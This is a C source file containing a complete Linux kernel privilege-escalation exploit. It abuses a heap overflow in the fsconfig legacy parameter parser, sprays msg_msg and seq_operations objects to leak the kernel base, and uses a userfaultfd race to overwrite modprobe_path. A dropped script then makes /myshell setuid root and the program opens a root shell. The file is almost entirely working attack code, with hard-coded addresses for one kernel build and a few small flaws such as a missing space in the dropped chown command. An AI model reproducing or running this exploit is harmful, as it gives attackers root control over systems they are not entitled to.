
#define _GNU_SOURCE
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <poll.h>
#include <linux/userfaultfd.h>

#define MODPROBE_TRIGGER "/tmp/modprobe_trigger"
#define MODPROBE_PROGRAM "/tmp/modprobe_program"
#define SHELL "/myshell"

#define SINGLE_START 0xffffffff81329bc0
#define MODPROBE_PATH 0xffffffff82a6bf20
#define KERNEL_BASE 0xffffffff81000000

#define NUM_SEQID 100
#define NUM_MSQIDS 8

#define MTEXT_SIZE_OOB (PAGE_SIZE + 32 - sizeof(struct msg_msg) - sizeof(struct msg_msgseg))
#define MTYPE_SPRAY 0x41
#define MTYPE_LEAK 0x42
#define PAGE_SIZE 0x1000

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) \
    syscall(__NR_fsconfig, fd, cmd, key, value, aux)

#define logdebug(fmt, ...) \
    dprintf(1, "\033[32m[*] " fmt "\033[0m\n", ##__VA_ARGS__)
#define loginfo(fmt, ...) \
    dprintf(1, "\033[34m[+] " fmt "\033[0m\n", ##__VA_ARGS__)
#define logerror(fmt, ...) \
    dprintf(2, "\033[31m[-] " fmt "\033[0m\n", ##__VA_ARGS__)
#define die(fmt, ...)                          \
    do                                         \
    {                                          \
        logerror(fmt, ##__VA_ARGS__);          \
        logerror("Exit at line %d", __LINE__); \
        exit(1);                               \
    } while (0)

struct list_head
{
    uint64_t next;
    uint64_t prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
    char mtext[0];
};

struct msg_msgseg
{
    uint64_t next;
};

struct typ_msg
{
    long mtype;
    char mtext[0];
};

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

struct seq_operations
{
    uint64_t start;
    uint64_t stop;
    uint64_t next;
    uint64_t show;
};

struct pipe_buf_operations
{
    uint64_t confirm;
    uint64_t release;
    uint64_t steal;
    uint64_t get;
};

uint64_t kbase, koffset;
char msg_buffer[0x2000];
struct typ_msg *msg_leak = (struct typ_msg *)msg_buffer;
int msqid[NUM_MSQIDS];
int seqid[NUM_SEQID];
int sync_pipe[2];

static pthread_t monitor_thread;

void registerUserFaultFd(void *addr, unsigned long len, void (*handler)(void *))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        die("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        die("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        die("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *)uffd);
    if (s != 0)
        die("pthread_create");
}

static int page_size = PAGE_SIZE;
static char *page = NULL;
static void *fault_handler_thread(void *arg)
{
    struct uffd_msg msg;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)arg;

    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);

    if (nready == -1)
        die("poll");

    nread = read(uffd, &msg, sizeof(msg));

    if (nread == 0)
        die("EOF on userfaultfd!\n");

    if (nread == -1)
        die("read");

    if (msg.event != UFFD_EVENT_PAGEFAULT)
        die("Unexpected event on userfaultfd\n");

    // do something
    char signal;
    memset(page, 0x43, page_size);
    char *evil = MODPROBE_PROGRAM;
    memcpy((void *)(page + PAGE_SIZE - sizeof(struct msg_msg)), evil, strlen(evil) + 1);
    // sync with the arb write thread

    logdebug("waiting for arb write thread...");
    read(sync_pipe[0], &signal, 1);

    uffdio_copy.src = (unsigned long)page;
    uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
                      ~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        die("ioctl-UFFDIO_COPY");

    return NULL;
}

int make_queue(key_t key, int msgflg)
{
    int ret;

    if ((ret = msgget(key, msgflg)) < 0)
        die("msgget() error");

    return ret;
}

void init_unshare()
{
    int fd;
    char buff[0x100];

    // strace from `unshare -Ur xxx`
    unshare(CLONE_NEWNS | CLONE_NEWUSER);

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getuid());
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getgid());
    write(fd, buff, strlen(buff));
    close(fd);
}

void bind_cpu()
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set))
    {
        die("sched_setaffinity() error");
    }
}

void init_modprobe()
{
    char filename[65];
    memset(filename, 0, sizeof(filename));
    int fd = open(MODPROBE_TRIGGER, O_RDWR | O_CREAT);
    if (fd < 0)
    {
        die("trigger creation failed");
    }
    char root[] = "\xff\xff\xff\xff";
    write(fd, root, sizeof(root));
    close(fd);
    char w[] = "#!/bin/sh\nchown 0:0" SHELL "&& chmod u+s " SHELL "\n";
    chmod(MODPROBE_TRIGGER, 0777);
    fd = open(MODPROBE_PROGRAM, O_RDWR | O_CREAT);
    if (fd < 0)
    {
        die("winner creation failed");
    }
    write(fd, w, sizeof(w));
    close(fd);
    chmod(MODPROBE_PROGRAM, 0777);
    return;
}

void init_msg()
{
    for (int i = 0; i < NUM_MSQIDS; i++)
        msqid[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) < 0)
        die("msgsnd() error");
}

ssize_t get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
    ssize_t ret;

    if ((ret = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg)) < 0)
        die("msgrcv() error");

    return ret;
}

void spray_4k(int count)
{
    char buffer[0x2000] = {0};
    struct typ_msg *message = (struct typ_msg *)buffer;
    memset(buffer, 0x41, sizeof(buffer));

    message->mtype = MTYPE_SPRAY;
    for (int i = 0; i < count; i++)
    {
        int qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(qid, message, PAGE_SIZE - sizeof(struct msg_msg), 0);
    }
}

int call_fsopen()
{
    int fd = fsopen("ext4", 0);
    if (fd < 0)
    {
        die("fsopen() error");
    }
    return fd;
}

void prepare_overflow(int fsid)
{

    char buff[0x100];
    logdebug("prepare fsconfig heap overflow");
    memset(buff, 0, sizeof(buff));
    memset(buff, 'A', 0x100 - 2);
    for (int i = 0; i < 0xf; i++)
    {
        // ",=" + buff
        fsconfig(fsid, FSCONFIG_SET_STRING, "\x00", buff, 0);
    }
    memset(buff, 0, sizeof(buff));
    memset(buff, 'B', 0x100 - 3);
    // ",=" + buff
    fsconfig(fsid, FSCONFIG_SET_STRING, "\x00", buff, 0);
}

void spray_seq()
{
    for (int i = 0; i < NUM_SEQID; i++)
    {
        if ((seqid[i] = open("/proc/self/stat", O_RDONLY)) < 0)
            die("spray_seq() error");
    }
}

void clean_seq()
{
    for (int i = 0; i < NUM_SEQID; i++)
        close(seqid[i]);
}

int do_leak()
{

    char buff[0x100];
    int fsid;
    uint64_t addr = 0;

    logdebug("--- do_leak ---");

    fsid = call_fsopen();
    prepare_overflow(fsid);

    logdebug("spraying messasge queue...");
    init_msg();
    for (int i = 0; i < NUM_MSQIDS; i++)
    {
        msg_leak->mtype = MTYPE_LEAK;
        send_msg(msqid[i], msg_leak, MTEXT_SIZE_OOB, 0);
    }

    logdebug("spraying seq_operations...");
    spray_seq();

    logdebug("trigger oob write in `legacy_parse_param` to msg_msg.m_ts");
    memset(buff, 0, sizeof(buff));
    strcat(buff, "0000000");  // m_list.next
    strcat(buff, "11111111"); // m_list.prev
    strcat(buff, "22222222"); // m_type
    uint64_t target_size = MTEXT_SIZE_OOB + 32 * 30;
    memcpy(buff + strlen(buff), &target_size, 2); // m_ts
    fsconfig(fsid, FSCONFIG_SET_STRING, "\x00", buff, 0);

    logdebug("searching corrupted msg_msg...");
    for (int i = 0; i < NUM_MSQIDS; i++)
    {
        size_t n = msgrcv(msqid[i], msg_leak, MTEXT_SIZE_OOB + 32 * 30, 0,
                          MSG_COPY | IPC_NOWAIT);
        if (n < 0)
            continue;

        if (n == MTEXT_SIZE_OOB + 32 * 30)
        {
            msqid[i] = make_queue(IPC_PRIVATE, IPC_CREAT | 0666); // call clean_msg without crash

            struct seq_operations *p =
                (struct seq_operations *)(msg_leak->mtext + MTEXT_SIZE_OOB);
            for (int j = 0; j < 30; j++)
            {
                if ((p[j].start & 0xfff) == (SINGLE_START & 0xfff) &&
                    p[j].start > KERNEL_BASE)
                {

                    addr = p[j].start;
                    loginfo("addr(%d) = %#lx", j, addr);
                    break;
                }
            }

            break;
        }
    }

    if (!addr)
    {
        return 0;
    }

    koffset = addr - SINGLE_START;
    kbase = koffset + KERNEL_BASE;
    loginfo("koffset = %#lx", koffset);
    loginfo("kbase = %#lx", kbase);

    return 1;
}

// overflow to change msg_msg.next to modprobe_path - 8
void *arb_write(void *args)
{
    char buff[0x100] = {0};
    uint64_t goal = MODPROBE_PATH + koffset - 8;
    memset(buff, 0, sizeof(buff));
    strcat(buff, "0000000");               // m_list.next
    strcat(buff, "11111111");              // m_list.prev
    strcat(buff, "22222222");              // m_type
    strcat(buff, "33333333");              // m_ts
    memcpy(buff + strlen(buff), &goal, 8); // next

    sleep(1);
    fsconfig((int)args, FSCONFIG_SET_STRING, "\x00", buff, 0);

    logdebug("done heap overflow");
    write(sync_pipe[1], "A", 1);
}

void modify_modprobe_path()
{
    int fsid;
    int target;
    char *buf;

    logdebug("--- modify_modprobe_path ---");

    logdebug("make queue");
    target = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    fsid = call_fsopen();
    prepare_overflow(fsid);

    logdebug("prepare fault handler");
    buf = (char *)mmap(NULL, page_size * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    registerUserFaultFd(buf + page_size, page_size, fault_handler_thread);

    pthread_t thread;
    int race = pthread_create(&thread, NULL, arb_write, (void *)fsid);
    if (race != 0)
    {
        die("can't setup threads for race");
    }

    logdebug("send message and then hang");
    struct typ_msg *msg = (struct typ_msg *)(buf + page_size - 8);
    msg->mtype = 0xaaa;
    send_msg(target, msg, page_size + 0x30 - sizeof(struct msg_msg), 0);
    pthread_join(thread, NULL);

    munmap(buf, page_size * 2);
}

void modprobe_trigger()
{
    logdebug("attempting to trigger modprobe");
    execve(MODPROBE_TRIGGER, NULL, NULL);
    return;
}

int main(int argc, char **argv)
{
    int retry_do_leak = 0;
    char *root_argv[] = {"-p", NULL};

    init_unshare();
    bind_cpu();
    init_modprobe();
    pipe(sync_pipe);

    spray_4k(30);
    while (!do_leak())
    {
        logdebug("retry do_leak() %d", ++retry_do_leak);
    }

    spray_4k(30);
    page = malloc(PAGE_SIZE);

    while (1)
    {
        modify_modprobe_path();
        modprobe_trigger();
        struct stat check;
        if (stat(SHELL, &check) < 0)
            die("error on checking");

        if (check.st_mode & S_ISUID)
            break;
    }

    logdebug("exploit success!");
    logdebug("popping shell");
    execve(SHELL, root_argv, NULL);
    return 0;
}